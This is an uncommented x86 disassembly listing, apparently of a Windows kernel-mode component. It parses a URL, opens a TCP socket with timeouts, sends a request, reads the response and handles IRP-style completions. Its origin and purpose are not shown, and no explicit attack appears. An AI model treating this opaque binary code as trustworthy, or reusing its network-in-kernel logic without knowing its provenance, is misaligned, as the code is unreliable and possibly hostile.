  405a8d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405a90:	c6 00 00             	movb   $0x0,(%eax)
  405a93:	8d 40 01             	lea    0x1(%eax),%eax
  405a96:	83 e9 01             	sub    $0x1,%ecx
  405a99:	75 f5                	jne    0x405a90
  405a9b:	51                   	push   %ecx
  405a9c:	68 00 08 00 00       	push   $0x800
  405aa1:	8d 85 fc f5 ff ff    	lea    -0xa04(%ebp),%eax
  405aa7:	50                   	push   %eax
  405aa8:	56                   	push   %esi
  405aa9:	e8 52 fc ff ff       	call   0x405700
  405aae:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ab1:	74 29                	je     0x405adc
  405ab3:	85 c0                	test   %eax,%eax
  405ab5:	74 25                	je     0x405adc
  405ab7:	50                   	push   %eax
  405ab8:	8d 85 fc f5 ff ff    	lea    -0xa04(%ebp),%eax
  405abe:	8b cf                	mov    %edi,%ecx
  405ac0:	50                   	push   %eax
  405ac1:	e8 3a 0c 00 00       	call   0x406700
  405ac6:	84 c0                	test   %al,%al
  405ac8:	74 0b                	je     0x405ad5
  405aca:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405ad1:	74 af                	je     0x405a82
  405ad3:	eb 07                	jmp    0x405adc
  405ad5:	8b cf                	mov    %edi,%ecx
  405ad7:	e8 b4 0c 00 00       	call   0x406790
  405adc:	56                   	push   %esi
  405add:	e8 5e fa ff ff       	call   0x405540
  405ae2:	8b cf                	mov    %edi,%ecx
  405ae4:	e8 77 0d 00 00       	call   0x406860
  405ae9:	85 c0                	test   %eax,%eax
  405aeb:	74 1d                	je     0x405b0a
  405aed:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405af4:	75 14                	jne    0x405b0a
  405af6:	5f                   	pop    %edi
  405af7:	b0 01                	mov    $0x1,%al
  405af9:	5e                   	pop    %esi
  405afa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405afd:	33 cd                	xor    %ebp,%ecx
  405aff:	e8 72 11 00 00       	call   0x406c76
  405b04:	8b e5                	mov    %ebp,%esp
  405b06:	5d                   	pop    %ebp
  405b07:	c2 08 00             	ret    $0x8
  405b0a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405b0d:	32 c0                	xor    %al,%al
  405b0f:	5f                   	pop    %edi
  405b10:	33 cd                	xor    %ebp,%ecx
  405b12:	5e                   	pop    %esi
  405b13:	e8 5e 11 00 00       	call   0x406c76
  405b18:	8b e5                	mov    %ebp,%esp
  405b1a:	5d                   	pop    %ebp
  405b1b:	c2 08 00             	ret    $0x8
  405b1e:	cc                   	int3
  405b1f:	cc                   	int3
  405b20:	55                   	push   %ebp
  405b21:	8b ec                	mov    %esp,%ebp
  405b23:	81 ec 50 0a 00 00    	sub    $0xa50,%esp
  405b29:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  405b2e:	33 c5                	xor    %ebp,%eax
  405b30:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b33:	8b 45 0c             	mov    0xc(%ebp),%eax
  405b36:	53                   	push   %ebx
  405b37:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405b3a:	56                   	push   %esi
  405b3b:	89 85 d8 f5 ff ff    	mov    %eax,-0xa28(%ebp)
  405b41:	33 f6                	xor    %esi,%esi
  405b43:	8b 45 10             	mov    0x10(%ebp),%eax
  405b46:	57                   	push   %edi
  405b47:	89 85 d4 f5 ff ff    	mov    %eax,-0xa2c(%ebp)
  405b4d:	33 ff                	xor    %edi,%edi
  405b4f:	8b 45 14             	mov    0x14(%ebp),%eax
  405b52:	68 10 04 00 00       	push   $0x410
  405b57:	89 85 d0 f5 ff ff    	mov    %eax,-0xa30(%ebp)
  405b5d:	8d 85 dc f5 ff ff    	lea    -0xa24(%ebp),%eax
  405b63:	57                   	push   %edi
  405b64:	50                   	push   %eax
  405b65:	e8 66 0d 00 00       	call   0x4068d0
  405b6a:	83 c4 0c             	add    $0xc,%esp
  405b6d:	80 3d b4 0b 41 00 00 	cmpb   $0x0,0x410bb4
  405b74:	0f 84 90 02 00 00    	je     0x405e0a
  405b7a:	8d 85 dc f5 ff ff    	lea    -0xa24(%ebp),%eax
  405b80:	50                   	push   %eax
  405b81:	53                   	push   %ebx
  405b82:	e8 a9 02 00 00       	call   0x405e30
  405b87:	84 c0                	test   %al,%al
  405b89:	0f 84 7b 02 00 00    	je     0x405e0a
  405b8f:	68 00 02 00 00       	push   $0x200
  405b94:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405b9a:	57                   	push   %edi
  405b9b:	50                   	push   %eax
  405b9c:	e8 2f 0d 00 00       	call   0x4068d0
  405ba1:	83 c4 0c             	add    $0xc,%esp
  405ba4:	6a 01                	push   $0x1
  405ba6:	e8 85 bf ff ff       	call   0x401b30
  405bab:	50                   	push   %eax
  405bac:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405bb2:	50                   	push   %eax
  405bb3:	e8 55 0d 00 00       	call   0x40690d
  405bb8:	83 c4 08             	add    $0x8,%esp
  405bbb:	8d 85 dc f5 ff ff    	lea    -0xa24(%ebp),%eax
  405bc1:	80 bd dc f5 ff ff 00 	cmpb   $0x0,-0xa24(%ebp)
  405bc8:	75 05                	jne    0x405bcf
  405bca:	b8 e6 6d 40 00       	mov    $0x406de6,%eax
  405bcf:	50                   	push   %eax
  405bd0:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405bd6:	50                   	push   %eax
  405bd7:	e8 31 0d 00 00       	call   0x40690d
  405bdc:	83 c4 08             	add    $0x8,%esp
  405bdf:	6a 02                	push   $0x2
  405be1:	e8 4a bf ff ff       	call   0x401b30
  405be6:	50                   	push   %eax
  405be7:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405bed:	50                   	push   %eax
  405bee:	e8 1a 0d 00 00       	call   0x40690d
  405bf3:	8d 85 ec f7 ff ff    	lea    -0x814(%ebp),%eax
  405bf9:	50                   	push   %eax
  405bfa:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405c00:	50                   	push   %eax
  405c01:	e8 07 0d 00 00       	call   0x40690d
  405c06:	83 c4 10             	add    $0x10,%esp
  405c09:	6a 04                	push   $0x4
  405c0b:	e8 20 bf ff ff       	call   0x401b30
  405c10:	50                   	push   %eax
  405c11:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405c17:	50                   	push   %eax
  405c18:	e8 f0 0c 00 00       	call   0x40690d
  405c1d:	68 00 04 00 00       	push   $0x400
  405c22:	8d 85 fc f9 ff ff    	lea    -0x604(%ebp),%eax
  405c28:	6a 00                	push   $0x0
  405c2a:	50                   	push   %eax
  405c2b:	e8 a0 0c 00 00       	call   0x4068d0
  405c30:	83 c4 14             	add    $0x14,%esp
  405c33:	89 b5 bc f5 ff ff    	mov    %esi,-0xa44(%ebp)
  405c39:	8d 85 ec f9 ff ff    	lea    -0x614(%ebp),%eax
  405c3f:	89 b5 c0 f5 ff ff    	mov    %esi,-0xa40(%ebp)
  405c45:	89 b5 c4 f5 ff ff    	mov    %esi,-0xa3c(%ebp)
  405c4b:	89 b5 c8 f5 ff ff    	mov    %esi,-0xa38(%ebp)
  405c51:	50                   	push   %eax
  405c52:	8d 85 b0 f5 ff ff    	lea    -0xa50(%ebp),%eax
  405c58:	89 b5 cc f5 ff ff    	mov    %esi,-0xa34(%ebp)
  405c5e:	50                   	push   %eax
  405c5f:	8d 85 dc f7 ff ff    	lea    -0x824(%ebp),%eax
  405c65:	c7 85 b0 f5 ff ff 02 	movl   $0x2,-0xa50(%ebp)
  405c6c:	00 00 00 
  405c6f:	50                   	push   %eax
  405c70:	8d 85 ec f7 ff ff    	lea    -0x814(%ebp),%eax
  405c76:	89 b5 b4 f5 ff ff    	mov    %esi,-0xa4c(%ebp)
  405c7c:	50                   	push   %eax
  405c7d:	c7 85 b8 f5 ff ff 01 	movl   $0x1,-0xa48(%ebp)
  405c84:	00 00 00 
  405c87:	e8 14 f9 ff ff       	call   0x4055a0
  405c8c:	6a 06                	push   $0x6
  405c8e:	6a 01                	push   $0x1
  405c90:	6a 02                	push   $0x2
  405c92:	e8 19 fb ff ff       	call   0x4057b0
  405c97:	6a 04                	push   $0x4
  405c99:	68 88 a7 40 00       	push   $0x40a788
  405c9e:	68 05 10 00 00       	push   $0x1005
  405ca3:	8b d8                	mov    %eax,%ebx
  405ca5:	68 ff ff 00 00       	push   $0xffff
  405caa:	53                   	push   %ebx
  405cab:	e8 d0 fa ff ff       	call   0x405780
  405cb0:	6a 04                	push   $0x4
  405cb2:	68 88 a7 40 00       	push   $0x40a788
  405cb7:	68 06 10 00 00       	push   $0x1006
  405cbc:	68 ff ff 00 00       	push   $0xffff
  405cc1:	53                   	push   %ebx
  405cc2:	e8 b9 fa ff ff       	call   0x405780
  405cc7:	85 db                	test   %ebx,%ebx
  405cc9:	0f 84 3b 01 00 00    	je     0x405e0a
  405ccf:	6a 10                	push   $0x10
  405cd1:	8d 85 ec f9 ff ff    	lea    -0x614(%ebp),%eax
  405cd7:	50                   	push   %eax
  405cd8:	53                   	push   %ebx
  405cd9:	e8 92 f8 ff ff       	call   0x405570
  405cde:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ce1:	0f 84 fb 00 00 00    	je     0x405de2
  405ce7:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405ced:	6a 00                	push   $0x0
  405cef:	50                   	push   %eax
  405cf0:	e8 f4 0b 00 00       	call   0x4068e9
  405cf5:	83 c4 04             	add    $0x4,%esp
  405cf8:	40                   	inc    %eax
  405cf9:	50                   	push   %eax
  405cfa:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
  405d00:	50                   	push   %eax
  405d01:	53                   	push   %ebx
  405d02:	e8 39 fa ff ff       	call   0x405740
  405d07:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d0a:	0f 84 d2 00 00 00    	je     0x405de2
  405d10:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405d17:	0f 85 c5 00 00 00    	jne    0x405de2
  405d1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405d20:	b9 00 04 00 00       	mov    $0x400,%ecx
  405d25:	8d 85 fc f9 ff ff    	lea    -0x604(%ebp),%eax
  405d2b:	eb 03                	jmp    0x405d30
  405d2d:	8d 49 00             	lea    0x0(%ecx),%ecx
  405d30:	c6 00 00             	movb   $0x0,(%eax)
  405d33:	8d 40 01             	lea    0x1(%eax),%eax
  405d36:	83 e9 01             	sub    $0x1,%ecx
  405d39:	75 f5                	jne    0x405d30
  405d3b:	51                   	push   %ecx
  405d3c:	68 ff 03 00 00       	push   $0x3ff
  405d41:	8d 85 fc f9 ff ff    	lea    -0x604(%ebp),%eax
  405d47:	50                   	push   %eax
  405d48:	53                   	push   %ebx
  405d49:	e8 b2 f9 ff ff       	call   0x405700
  405d4e:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d51:	0f 84 8b 00 00 00    	je     0x405de2
  405d57:	80 bd fc f9 ff ff 00 	cmpb   $0x0,-0x604(%ebp)
  405d5e:	0f 84 7e 00 00 00    	je     0x405de2
  405d64:	85 c0                	test   %eax,%eax
  405d66:	74 7a                	je     0x405de2
  405d68:	ff b5 d8 f5 ff ff    	push   -0xa28(%ebp)
  405d6e:	c6 85 fb fd ff ff 00 	movb   $0x0,-0x205(%ebp)
  405d75:	e8 6f 0b 00 00       	call   0x4068e9
  405d7a:	8b 8d d4 f5 ff ff    	mov    -0xa2c(%ebp),%ecx
  405d80:	2b c8                	sub    %eax,%ecx
  405d82:	8d 85 fc f9 ff ff    	lea    -0x604(%ebp),%eax
  405d88:	49                   	dec    %ecx
  405d89:	51                   	push   %ecx
  405d8a:	50                   	push   %eax
  405d8b:	ff b5 d8 f5 ff ff    	push   -0xa28(%ebp)
  405d91:	e8 83 0b 00 00       	call   0x406919
  405d96:	8d 85 fc f9 ff ff    	lea    -0x604(%ebp),%eax
  405d9c:	50                   	push   %eax
  405d9d:	e8 47 0b 00 00       	call   0x4068e9
  405da2:	8b 95 d4 f5 ff ff    	mov    -0xa2c(%ebp),%edx
  405da8:	83 c4 14             	add    $0x14,%esp
  405dab:	03 f0                	add    %eax,%esi
  405dad:	8b ca                	mov    %edx,%ecx
  405daf:	8b 85 d0 f5 ff ff    	mov    -0xa30(%ebp),%eax
  405db5:	83 d7 00             	adc    $0x0,%edi
  405db8:	83 c1 ff             	add    $0xffffffff,%ecx
  405dbb:	83 d0 ff             	adc    $0xffffffff,%eax
  405dbe:	3b f8                	cmp    %eax,%edi
  405dc0:	77 15                	ja     0x405dd7
  405dc2:	72 04                	jb     0x405dc8
  405dc4:	3b f1                	cmp    %ecx,%esi
  405dc6:	73 0f                	jae    0x405dd7
  405dc8:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405dcf:	0f 84 4b ff ff ff    	je     0x405d20
  405dd5:	eb 0b                	jmp    0x405de2
  405dd7:	8b 85 d8 f5 ff ff    	mov    -0xa28(%ebp),%eax
  405ddd:	c6 44 02 ff 00       	movb   $0x0,-0x1(%edx,%eax,1)
  405de2:	53                   	push   %ebx
  405de3:	e8 58 f7 ff ff       	call   0x405540
  405de8:	0b f7                	or     %edi,%esi
  405dea:	74 1e                	je     0x405e0a
  405dec:	80 3d 04 a8 40 00 00 	cmpb   $0x0,0x40a804
  405df3:	75 15                	jne    0x405e0a
  405df5:	5f                   	pop    %edi
  405df6:	5e                   	pop    %esi
  405df7:	b0 01                	mov    $0x1,%al
  405df9:	5b                   	pop    %ebx
  405dfa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405dfd:	33 cd                	xor    %ebp,%ecx
  405dff:	e8 72 0e 00 00       	call   0x406c76
  405e04:	8b e5                	mov    %ebp,%esp
  405e06:	5d                   	pop    %ebp
  405e07:	c2 10 00             	ret    $0x10
  405e0a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405e0d:	32 c0                	xor    %al,%al
  405e0f:	5f                   	pop    %edi
  405e10:	5e                   	pop    %esi
  405e11:	33 cd                	xor    %ebp,%ecx
  405e13:	5b                   	pop    %ebx
  405e14:	e8 5d 0e 00 00       	call   0x406c76
  405e19:	8b e5                	mov    %ebp,%esp
  405e1b:	5d                   	pop    %ebp
  405e1c:	c2 10 00             	ret    $0x10
  405e1f:	cc                   	int3
  405e20:	e8 0b 06 00 00       	call   0x406430
  405e25:	85 c0                	test   %eax,%eax
  405e27:	0f 99 c0             	setns  %al
  405e2a:	a2 b4 0b 41 00       	mov    %al,0x410bb4
  405e2f:	c3                   	ret
  405e30:	55                   	push   %ebp
  405e31:	8b ec                	mov    %esp,%ebp
  405e33:	81 ec 20 04 00 00    	sub    $0x420,%esp
  405e39:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  405e3e:	33 c5                	xor    %ebp,%eax
  405e40:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e43:	53                   	push   %ebx
  405e44:	56                   	push   %esi
  405e45:	8b 75 08             	mov    0x8(%ebp),%esi
  405e48:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  405e4e:	57                   	push   %edi
  405e4f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405e52:	68 00 04 00 00       	push   $0x400
  405e57:	6a 00                	push   $0x0
  405e59:	50                   	push   %eax
  405e5a:	e8 71 0a 00 00       	call   0x4068d0
  405e5f:	68 ff 03 00 00       	push   $0x3ff
  405e64:	56                   	push   %esi
  405e65:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  405e6b:	68 ff 03 00 00       	push   $0x3ff
  405e70:	50                   	push   %eax
  405e71:	e8 c1 0a 00 00       	call   0x406937
  405e76:	33 c0                	xor    %eax,%eax
  405e78:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405e7b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  405e7e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  405e81:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405e84:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405e87:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
  405e8d:	50                   	push   %eax
  405e8e:	e8 56 0a 00 00       	call   0x4068e9
  405e93:	8d 8d e8 fb ff ff    	lea    -0x418(%ebp),%ecx
  405e99:	03 c1                	add    %ecx,%eax
  405e9b:	89 85 e0 fb ff ff    	mov    %eax,-0x420(%ebp)
  405ea1:	8b c1                	mov    %ecx,%eax
  405ea3:	68 de 6d 40 00       	push   $0x406dde
  405ea8:	50                   	push   %eax
  405ea9:	e8 71 0a 00 00       	call   0x40691f
  405eae:	8b d8                	mov    %eax,%ebx
  405eb0:	83 c4 28             	add    $0x28,%esp
  405eb3:	85 db                	test   %ebx,%ebx
  405eb5:	74 05                	je     0x405ebc
  405eb7:	83 c3 02             	add    $0x2,%ebx
  405eba:	eb 06                	jmp    0x405ec2
  405ebc:	8d 9d e8 fb ff ff    	lea    -0x418(%ebp),%ebx
  405ec2:	6a 3a                	push   $0x3a
  405ec4:	53                   	push   %ebx
  405ec5:	e8 67 0a 00 00       	call   0x406931
  405eca:	6a 2f                	push   $0x2f
  405ecc:	53                   	push   %ebx
  405ecd:	89 85 e4 fb ff ff    	mov    %eax,-0x41c(%ebp)
  405ed3:	e8 59 0a 00 00       	call   0x406931
  405ed8:	8b f0                	mov    %eax,%esi
  405eda:	83 c4 10             	add    $0x10,%esp
  405edd:	85 f6                	test   %esi,%esi
  405edf:	75 08                	jne    0x405ee9
  405ee1:	8b b5 e0 fb ff ff    	mov    -0x420(%ebp),%esi
  405ee7:	eb 14                	jmp    0x405efd
  405ee9:	68 ff 01 00 00       	push   $0x1ff
  405eee:	56                   	push   %esi
  405eef:	68 ff 01 00 00       	push   $0x1ff
  405ef4:	57                   	push   %edi
  405ef5:	e8 3d 0a 00 00       	call   0x406937
  405efa:	83 c4 10             	add    $0x10,%esp
  405efd:	8b 85 e4 fb ff ff    	mov    -0x41c(%ebp),%eax
  405f03:	85 c0                	test   %eax,%eax
  405f05:	74 40                	je     0x405f47
  405f07:	40                   	inc    %eax
  405f08:	2b f0                	sub    %eax,%esi
  405f0a:	56                   	push   %esi
  405f0b:	50                   	push   %eax
  405f0c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405f0f:	50                   	push   %eax
  405f10:	e8 b5 09 00 00       	call   0x4068ca
  405f15:	83 c4 0c             	add    $0xc,%esp
  405f18:	83 fe 14             	cmp    $0x14,%esi
  405f1b:	0f 83 94 00 00 00    	jae    0x405fb5
  405f21:	56                   	push   %esi
  405f22:	8d 45 e8             	lea    -0x18(%ebp),%eax
  405f25:	c6 44 35 e8 00       	movb   $0x0,-0x18(%ebp,%esi,1)
  405f2a:	50                   	push   %eax
  405f2b:	8d 87 00 02 00 00    	lea    0x200(%edi),%eax
  405f31:	50                   	push   %eax
  405f32:	e8 93 09 00 00       	call   0x4068ca
  405f37:	c6 84 37 00 02 00 00 	movb   $0x0,0x200(%edi,%esi,1)
  405f3e:	00 
  405f3f:	8b b5 e4 fb ff ff    	mov    -0x41c(%ebp),%esi
  405f45:	eb 13                	jmp    0x405f5a
  405f47:	6a 03                	push   $0x3
  405f49:	8d 87 00 02 00 00    	lea    0x200(%edi),%eax
  405f4f:	68 e2 6d 40 00       	push   $0x406de2
  405f54:	50                   	push   %eax
  405f55:	e8 70 09 00 00       	call   0x4068ca
  405f5a:	2b f3                	sub    %ebx,%esi
  405f5c:	8d 87 10 02 00 00    	lea    0x210(%edi),%eax
  405f62:	83 c4 0c             	add    $0xc,%esp
  405f65:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  405f6b:	7e 2b                	jle    0x405f98
  405f6d:	68 00 02 00 00       	push   $0x200
  405f72:	53                   	push   %ebx
  405f73:	50                   	push   %eax
  405f74:	e8 51 09 00 00       	call   0x4068ca
  405f79:	83 c4 0c             	add    $0xc,%esp
  405f7c:	c6 87 0f 04 00 00 00 	movb   $0x0,0x40f(%edi)
  405f83:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405f86:	b0 01                	mov    $0x1,%al
  405f88:	5f                   	pop    %edi
  405f89:	5e                   	pop    %esi
  405f8a:	33 cd                	xor    %ebp,%ecx
  405f8c:	5b                   	pop    %ebx
  405f8d:	e8 e4 0c 00 00       	call   0x406c76
  405f92:	8b e5                	mov    %ebp,%esp
  405f94:	5d                   	pop    %ebp
  405f95:	c2 08 00             	ret    $0x8
  405f98:	56                   	push   %esi
  405f99:	53                   	push   %ebx
  405f9a:	50                   	push   %eax
  405f9b:	e8 2a 09 00 00       	call   0x4068ca
  405fa0:	83 c4 0c             	add    $0xc,%esp
  405fa3:	81 fe 00 02 00 00    	cmp    $0x200,%esi
  405fa9:	7d d1                	jge    0x405f7c
  405fab:	c6 84 3e 10 02 00 00 	movb   $0x0,0x210(%esi,%edi,1)
  405fb2:	00 
  405fb3:	eb ce                	jmp    0x405f83
  405fb5:	e8 f6 0c 00 00       	call   0x406cb0
  405fba:	cc                   	int3
  405fbb:	cc                   	int3
  405fbc:	cc                   	int3
  405fbd:	cc                   	int3
  405fbe:	cc                   	int3
  405fbf:	cc                   	int3
  405fc0:	55                   	push   %ebp
  405fc1:	8b ec                	mov    %esp,%ebp
  405fc3:	56                   	push   %esi
  405fc4:	8b 75 08             	mov    0x8(%ebp),%esi
  405fc7:	6a 00                	push   $0x0
  405fc9:	6a 01                	push   $0x1
  405fcb:	56                   	push   %esi
  405fcc:	ff 15 9c 71 40 00    	call   *0x40719c
  405fd2:	6a 00                	push   $0x0
  405fd4:	6a 01                	push   $0x1
  405fd6:	ff 15 8c 71 40 00    	call   *0x40718c
  405fdc:	89 46 10             	mov    %eax,0x10(%esi)
  405fdf:	85 c0                	test   %eax,%eax
  405fe1:	75 0a                	jne    0x405fed
  405fe3:	b8 9a 00 00 c0       	mov    $0xc000009a,%eax
  405fe8:	5e                   	pop    %esi
  405fe9:	5d                   	pop    %ebp
  405fea:	c2 04 00             	ret    $0x4
  405fed:	8b 40 60             	mov    0x60(%eax),%eax
  405ff0:	89 70 fc             	mov    %esi,-0x4(%eax)
  405ff3:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  405ffa:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  405ffe:	33 c0                	xor    %eax,%eax
  406000:	5e                   	pop    %esi
  406001:	5d                   	pop    %ebp
  406002:	c2 04 00             	ret    $0x4
  406005:	cc                   	int3
  406006:	cc                   	int3
  406007:	cc                   	int3
  406008:	cc                   	int3
  406009:	cc                   	int3
  40600a:	cc                   	int3
  40600b:	cc                   	int3
  40600c:	cc                   	int3
  40600d:	cc                   	int3
  40600e:	cc                   	int3
  40600f:	cc                   	int3
  406010:	55                   	push   %ebp
  406011:	8b ec                	mov    %esp,%ebp
  406013:	6a 00                	push   $0x0
  406015:	6a 00                	push   $0x0
  406017:	ff 75 10             	push   0x10(%ebp)
  40601a:	ff 15 98 71 40 00    	call   *0x407198
  406020:	b8 16 00 00 c0       	mov    $0xc0000016,%eax
  406025:	5d                   	pop    %ebp
  406026:	c2 0c 00             	ret    $0xc
  406029:	cc                   	int3
  40602a:	cc                   	int3
  40602b:	cc                   	int3
  40602c:	cc                   	int3
  40602d:	cc                   	int3
  40602e:	cc                   	int3
  40602f:	cc                   	int3
  406030:	55                   	push   %ebp
  406031:	8b ec                	mov    %esp,%ebp
  406033:	56                   	push   %esi
  406034:	8b 75 08             	mov    0x8(%ebp),%esi
  406037:	56                   	push   %esi
  406038:	ff 15 14 71 40 00    	call   *0x407114
  40603e:	8b 46 10             	mov    0x10(%esi),%eax
  406041:	68 01 00 00 c0       	push   $0xc0000001
  406046:	50                   	push   %eax
  406047:	ff 15 88 71 40 00    	call   *0x407188
  40604d:	8b 46 10             	mov    0x10(%esi),%eax
  406050:	8b 40 60             	mov    0x60(%eax),%eax
  406053:	89 70 fc             	mov    %esi,-0x4(%eax)
  406056:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  40605d:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  406061:	5e                   	pop    %esi
  406062:	5d                   	pop    %ebp
  406063:	c2 04 00             	ret    $0x4
  406066:	cc                   	int3
  406067:	cc                   	int3
  406068:	cc                   	int3
  406069:	cc                   	int3
  40606a:	cc                   	int3
  40606b:	cc                   	int3
  40606c:	cc                   	int3
  40606d:	cc                   	int3
  40606e:	cc                   	int3
  40606f:	cc                   	int3
  406070:	55                   	push   %ebp
  406071:	8b ec                	mov    %esp,%ebp
  406073:	57                   	push   %edi
  406074:	8b 7d 08             	mov    0x8(%ebp),%edi
  406077:	85 ff                	test   %edi,%edi
  406079:	0f 84 93 00 00 00    	je     0x406112
  40607f:	57                   	push   %edi
  406080:	ff 15 c8 70 40 00    	call   *0x4070c8
  406086:	84 c0                	test   %al,%al
  406088:	0f 84 84 00 00 00    	je     0x406112
  40608e:	53                   	push   %ebx
  40608f:	56                   	push   %esi
  406090:	8d 5f 08             	lea    0x8(%edi),%ebx
  406093:	53                   	push   %ebx
  406094:	ff 15 14 71 40 00    	call   *0x407114
  40609a:	8b 43 10             	mov    0x10(%ebx),%eax
  40609d:	68 01 00 00 c0       	push   $0xc0000001
  4060a2:	50                   	push   %eax
  4060a3:	ff 15 88 71 40 00    	call   *0x407188
  4060a9:	8b 43 10             	mov    0x10(%ebx),%eax
  4060ac:	8b 40 60             	mov    0x60(%eax),%eax
  4060af:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  4060b6:	89 58 fc             	mov    %ebx,-0x4(%eax)
  4060b9:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  4060bd:	8b 77 04             	mov    0x4(%edi),%esi
  4060c0:	8b 47 18             	mov    0x18(%edi),%eax
  4060c3:	50                   	push   %eax
  4060c4:	8b 07                	mov    (%edi),%eax
  4060c6:	8b 76 04             	mov    0x4(%esi),%esi
  4060c9:	8b ce                	mov    %esi,%ecx
  4060cb:	50                   	push   %eax
  4060cc:	ff 15 cc 71 40 00    	call   *0x4071cc
  4060d2:	ff d6                	call   *%esi
  4060d4:	8b f0                	mov    %eax,%esi
  4060d6:	81 fe 03 01 00 00    	cmp    $0x103,%esi
  4060dc:	75 15                	jne    0x4060f3
  4060de:	6a 00                	push   $0x0
  4060e0:	6a 00                	push   $0x0
  4060e2:	6a 00                	push   $0x0
  4060e4:	6a 00                	push   $0x0
  4060e6:	53                   	push   %ebx
  4060e7:	ff 15 94 71 40 00    	call   *0x407194
  4060ed:	8b 43 10             	mov    0x10(%ebx),%eax
  4060f0:	8b 70 18             	mov    0x18(%eax),%esi
  4060f3:	8b 47 18             	mov    0x18(%edi),%eax
  4060f6:	50                   	push   %eax
  4060f7:	ff 15 80 70 40 00    	call   *0x407080
  4060fd:	68 7a 63 64 76       	push   $0x7664637a
  406102:	57                   	push   %edi
  406103:	ff 15 ac 71 40 00    	call   *0x4071ac
  406109:	8b c6                	mov    %esi,%eax
  40610b:	5e                   	pop    %esi
  40610c:	5b                   	pop    %ebx
  40610d:	5f                   	pop    %edi
  40610e:	5d                   	pop    %ebp
  40610f:	c2 04 00             	ret    $0x4
  406112:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  406117:	5f                   	pop    %edi
  406118:	5d                   	pop    %ebp
  406119:	c2 04 00             	ret    $0x4
  40611c:	cc                   	int3
  40611d:	cc                   	int3
  40611e:	cc                   	int3
  40611f:	cc                   	int3
  406120:	55                   	push   %ebp
  406121:	8b ec                	mov    %esp,%ebp
  406123:	83 ec 18             	sub    $0x18,%esp
  406126:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  40612b:	33 c5                	xor    %ebp,%eax
  40612d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406130:	8b 45 0c             	mov    0xc(%ebp),%eax
  406133:	57                   	push   %edi
  406134:	8b 7d 08             	mov    0x8(%ebp),%edi
  406137:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40613a:	85 ff                	test   %edi,%edi
  40613c:	0f 84 da 00 00 00    	je     0x40621c
  406142:	57                   	push   %edi
  406143:	ff 15 c8 70 40 00    	call   *0x4070c8
  406149:	84 c0                	test   %al,%al
  40614b:	0f 84 cb 00 00 00    	je     0x40621c
  406151:	53                   	push   %ebx
  406152:	56                   	push   %esi
  406153:	8d 5f 08             	lea    0x8(%edi),%ebx
  406156:	53                   	push   %ebx
  406157:	ff 15 14 71 40 00    	call   *0x407114
  40615d:	8b 43 10             	mov    0x10(%ebx),%eax
  406160:	68 01 00 00 c0       	push   $0xc0000001
  406165:	50                   	push   %eax
  406166:	ff 15 88 71 40 00    	call   *0x407188
  40616c:	8b 43 10             	mov    0x10(%ebx),%eax
  40616f:	8b 40 60             	mov    0x60(%eax),%eax
  406172:	c7 40 f8 10 60 40 00 	movl   $0x406010,-0x8(%eax)
  406179:	89 58 fc             	mov    %ebx,-0x4(%eax)
  40617c:	c6 40 df e0          	movb   $0xe0,-0x21(%eax)
  406180:	8b 47 18             	mov    0x18(%edi),%eax
  406183:	8b 77 04             	mov    0x4(%edi),%esi
  406186:	50                   	push   %eax
  406187:	6a 00                	push   $0x0
  406189:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40618c:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  406193:	50                   	push   %eax
  406194:	8b 07                	mov    (%edi),%eax
  406196:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40619d:	8b 76 08             	mov    0x8(%esi),%esi
  4061a0:	8b ce                	mov    %esi,%ecx
  4061a2:	50                   	push   %eax
  4061a3:	ff 15 cc 71 40 00    	call   *0x4071cc
